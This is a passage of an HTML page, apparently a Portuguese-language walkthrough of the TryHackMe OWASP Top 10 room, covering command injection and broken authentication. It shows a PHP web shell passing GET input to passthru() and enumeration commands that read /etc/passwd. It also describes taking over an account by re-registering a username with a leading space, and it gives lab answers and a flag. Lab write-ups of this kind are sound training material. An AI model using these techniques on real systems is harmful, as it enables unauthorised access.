+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#xxe---payload">XXE - Payload
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-3">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#explorando">Explorando
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-4">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#controle-de-acesso-quebrado">Controle de acesso quebrado
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#idor">IDOR
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-5">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#configura%c3%a7%c3%a3o-de-seguran%c3%a7a-incorreta">Configuração de segurança incorreta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-6">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#cross-site-scripting">Cross-site Scripting
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#xss-payloads">XSS Payloads
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#xsschallenge">XSS Challenge
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-7">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desserializa%c3%a7%c3%a3o-insegura">Desserialização insegura
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-8">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#objetos">Objetos
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pergunta">Pergunta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#desserializa%c3%a7%c3%a3o">Desserialização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pergunta-1">Pergunta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#cookies">Cookies
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#cria%c3%a7%c3%a3o-do-cookie">Criação do Cookie
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-9">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pr%c3%a1tica---cookies">Prática - Cookies
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-10">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#execu%c3%a7%c3%a3o-de-c%c3%b3digo">Execução de código
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#componentes-com-vulnerabilidades-conhecidas">Componentes com vulnerabilidades conhecidas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#laborat%c3%b3rio">Laboratório
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-11">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#registro-e-monitoramento-insuficientes">Registro e monitoramento insuficientes
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#perguntas-12">Perguntas
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#conclus%c3%a3o">Conclusão
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button id="backToTop" tabindex="-1" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Voltar ao topo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--hextra-navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main id="content" class="hx:w-full hx:min-w-0 hextra-max-content-width hx:px-6 hx:pt-4 hx:md:px-12">
+        
+        
+        <br class="hx:mt-1.5 hx:text-sm" />
+        <h1 class="hx:text-center hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">OWASP Top 10 - THM</h1>
+        <div class="hx:mb-16"></div>
+        <div class="content">
+          
+          <h2 data-hextra-search-id="introdução">Introdução<span class="hx:absolute hx:-mt-20" id="introdução"></span>
+    <a href="#introdu%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Nesta aula, são ensinados os métodos para explorar cada vulnerabilidade do OWASP Top 10. Documentarei e detalharei as etapas de cada uma das vulnerabilidades mencionadas na aula.</p>
+<p>Para acessar a aula <a
+    href="https://tryhackme.com/r/room/owasptop10"target="_blank" rel="noopener">clique aqui OWASP TOP 10</a></p>
+<h2 data-hextra-search-id="injeção">Injeção<span class="hx:absolute hx:-mt-20" id="injeção"></span>
+    <a href="#inje%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>É uma vulnerabilidade comum nas aplicações atuais. A falha ocorre porque a entrada de dados enviada pelo usuário é interpretada como comandos ou parâmetros, sem validação ou sanitização dos dados enviados. Assim, o atacante pode executar comandos arbitrários no sistema, como acessar, modificar e até mesmo deletar informações contidas no servidor. Exemplos de códigos podem ser injetados.</p>
+<ul>
+<li>SQL Injection</li>
+<li>Command Injection</li>
+</ul>
+<p>A injeção de comando ocorre do lado do servidor. A aplicação realiza uma chamada de sistema, e nesse momento o atacante toma vantagem. Com a utilização do caracter <code>;</code> antes dos comandos, o atacante pode quebrar a aplicação e executar os comandos que deseja. No exemplo a seguir, não é necessária a utilização do <code>;</code>.</p>
+<h3 data-hextra-search-id="command-injection">Command Injection<span class="hx:absolute hx:-mt-20" id="command-injection"></span>
+    <a href="#command-injection" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Existem dois tipos de injeção de comandos: ativa, onde a aplicação retorna visualmente no HTML da página a resposta do nosso comando; e a injeção às cegas, onde não recebemos no HTML uma resposta da aplicação.</p>
+<p>No primeiro exemplo, temos um host que possui um web shell disponível na internet. Abaixo, está o código PHP da aplicação.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;commandString&#34;</span>])) {
+</span></span><span style="display:flex;"><span>	$command_string <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#34;commandString&#34;</span>];
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">passthru</span>($command_string);
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Error</span> $error) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;&lt;p class=mt-3&gt;&lt;b&gt;</span><span style="color:#e6db74">$error</span><span style="color:#e6db74">&lt;/b&gt;&lt;/p&gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>                        
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<p>O código acima verifica se o comando passado é válido. Caso seja, exibe o resultado na tela; caso contrário, a aplicação não retorna nada.</p>
+<p>Como mencionado na aula, primeiro precisamos enumerar nosso host e descobrir qual é seu sistema operacional: Windows ou Linux. Podemos descobrir isso facilmente executando comandos em cada sistema.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Linux
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	- whoami
+</span></span><span style="display:flex;"><span>	- id
+</span></span><span style="display:flex;"><span>	- ifconfig/ip addr
+</span></span><span style="display:flex;"><span>	- uname -a
+</span></span><span style="display:flex;"><span>	- ps -ef
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	- whoami
+</span></span><span style="display:flex;"><span>	- ver
+</span></span><span style="display:flex;"><span>	- ipconfig
+</span></span><span style="display:flex;"><span>	- tasklist
+</span></span><span style="display:flex;"><span>	- netstat -an</span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0">
+  <button
+    class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+    title="Copiar código"
+    aria-label="Copiar código"
+    data-copied-label="Copiado!"
+  >
+    <div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"></div>
+<div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"></div>
+  </button>
+</div>
+</div>
+<h4 data-hextra-search-id="perguntas">Perguntas<span class="hx:absolute hx:-mt-20" id="perguntas"></span>
+    <a href="#perguntas" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h4><p><strong>What strange text file is in the website root directory?</strong><br>
+Com o comando <code>ls</code> listamos os arquivos no diretório atual
+Resposta: <code>drpepper.txt</code></p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-LS.webp" alt="drpepper"  loading="lazy" /></p>
+<p><strong>How many non-root/non-service/non-daemon users are there?</strong><br>
+Para saber a quantidade precisamos olhar o arquivo <code>/etc/passwd</code>.</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-PASSWD.webp" alt="passwd"  loading="lazy" /></p>
+<p><code>Syslog</code> é um serviço, podemos filtrar também por <code>x:100</code>, no caso não temos nenhum usuário no host.<br>
+Resposta: <code>0</code></p>
+<p><strong>What user is this app running as?</strong><br>
+Com o comando <code>id</code> descobrimos qual usuário está executando nossos comandos.<br>
+Resposta: <code>www-data</code></p>
+<p><strong>What is the user&rsquo;s shell set as?</strong><br>
+Com o comando <code>grep &quot;www-data&quot; /etc/passwd</code> descobrimos qual é a shell do usuário.<br>
+Resposta:<code>/usr/sbin/nologin</code></p>
+<p><strong>What version of Ubuntu is running?</strong><br>
+Comando para descobrir <code>lsb_release -a</code>.<br>
+Resposta:<code>18.04.4</code></p>
+<p><strong>Print out the MOTD.  What favorite beverage is shown?</strong><br>
+MOTD significa: <code>message of the day</code>.<br>
+Pesquisando na documentação <code>man motd</code> não encontramos o arquivo <code>/etc/motd</code>, sendo assim vamos utilizar um comando para localizar todos os arquivos com o nome de <code>motd</code>.
+O retorno do comando trás diversos arquivos, com a dica da questão sabemos qual arquivo devemos verificar.</p>
+<p>Arquivo:<code>/etc/update-motd.d/00-header</code>.<br>
+Nossa resposta está no final do arquivo.<br>
+Resposa:<code>Dr Pepper</code></p>
+<h2 data-hextra-search-id="autenticação-quebrada">Autenticação quebrada<span class="hx:absolute hx:-mt-20" id="autenticação-quebrada"></span>
+    <a href="#autentica%c3%a7%c3%a3o-quebrada" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Autenticação e gerenciamento de sessão são as bases das aplicações modernas. Autenticamos em uma aplicação e nos mantemos conectados, respectivamente. A autenticação, tradicionalmente, é feita com usuário e senha; já o gerenciamento da sessão é realizado através de cookies de sessão. Como o protocolo HTTPS não mantém informações da sessão (<em>stateless</em>), o cookie possui um papel importante, fornecendo informações e mantendo a autenticação do usuário com o servidor.</p>
+<p>O atacante que consegue explorar essa falha tem a possibilidade de acessar outras contas de usuários. Abaixo, algumas falhas comuns em mecanismos de autenticação:</p>
+<ul>
+<li>
+<p><strong>Brute force:</strong> se a aplicação usa usuário e senha, e não possui um mecanismo que mitigue o ataque, é possível tentar adivinhar as credenciais.</p>
+</li>
+<li>
+<p><strong>Credenciais fracas:</strong> se a aplicação usa senhas fracas, comuns, por exemplo <code>password1</code>, o atacante pode facilmente adivinhar a senha, sem precisar utilizar diversas tentativas.</p>
+</li>
+<li>
+<p><strong>Cookies de sessão fracos:</strong> se o cookie possui valores fáceis de prever, o atacante pode forjar um cookie falso e também realizar a troca de usuário.</p>
+</li>
+</ul>
+<p>Abaixo, as formas para mitigar esses tipos de ataque:</p>
+<ul>
+<li>
+<p><strong>Criar controles:</strong> controles que mitiguem o uso excessivo em um curto espaço de tempo para tentativas de acesso.</p>
+</li>
+<li>
+<p><strong>Política de criação de senha.</strong></p>
+</li>
+<li>
+<p><strong>Implementação de multi-fator de autenticação.</strong></p>
+</li>
+</ul>
+<p><strong>I&rsquo;ve understood broken authentication mechanisms.</strong><br>
+Não é necessário resposta.</p>
+<h3 data-hextra-search-id="prática">Prática<span class="hx:absolute hx:-mt-20" id="prática"></span>
+    <a href="#pr%c3%a1tica" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>No exercício, é fornecida uma aplicação que não realiza as devidas validações no registro de usuário. Quando tentamos criar um novo usuário, é verificado se o usuário já existe. Caso exista, a seguinte mensagem é mostrada:</p>
+<p><code># Error: This user is already registered</code></p>
+<p>Dessa forma, conseguimos enumerar os usuários na aplicação. A vulnerabilidade ocorre quando informamos, no registro de usuário, um espaço no início do nome. A aplicação não realiza as devidas validações e, com isso, conseguimos re-registrar o mesmo usuário na aplicação, porém agora com a senha que criamos no momento do cadastro, exemplo a seguir:</p>
+<p><img src="/assets/img/posts/2025/01/OWASPTOP10/OWASPTOP10-AUTH.webp" alt="darren"  loading="lazy" /></p>
+<p>Após re-registrar o usuário  &ldquo;<code> darren</code>&rdquo;, conseguimos realizar o login e obtemos a resposta para primeira pergunta da tarefa.</p>
+<p><strong>What is the flag that you found in darren&rsquo;s account?</strong><br>
+Resposta: <code>fe86079416a21a3c99937fea8874b667</code></p>
+<p><strong>Now try to do the same trick and see if you can login as arthur.</strong><br>
+Não é necessário resposta.</p>
+<h2 data-hextra-search-id="exposição-de-dados-sensíveis">Exposição de dados sensíveis<span class="hx:absolute hx:-mt-20" id="exposição-de-dados-sensíveis"></span>
+    <a href="#exposi%c3%a7%c3%a3o-de-dados-sens%c3%adveis" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Quando uma aplicação divulga acidentalmente dados confidenciais, isso é chamado de &ldquo;Exposição de dados sensíveis&rdquo;. Esses dados são facilmente cruzados com os clientes.</p>
+<p><strong>Read the introduction to Sensitive Data Exposure and deploy the machine.</strong><br>
+Resposta: não é necessário responder.</p>
+<h3 data-hextra-search-id="banco-de-dados">Banco de dados<span class="hx:absolute hx:-mt-20" id="banco-de-dados"></span>
+    <a href="#banco-de-dados" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h3><p>Aplicações web precisam de soluções que suportem uma grande quantidade de dados e que sejam em formato acessível. Normalmente, esses dados são armazenados em bancos de dados que utilizam SQL e, em alguns casos, NoSQL. É comum ver servidores dedicados para bancos de dados, rodando MariaDB e MySQL. Outra forma de armazenamento dos dados é feita em um único arquivo chamado <code>flat file database</code>.</p>
+<p>Uma <strong>Flat File Database</strong> é um tipo de banco de dados simples que armazena informações em um único arquivo de texto, sem a necessidade de um sistema de gerenciamento de banco de dados complexo. Os dados são organizados em linhas e colunas, semelhante a uma planilha.</p>
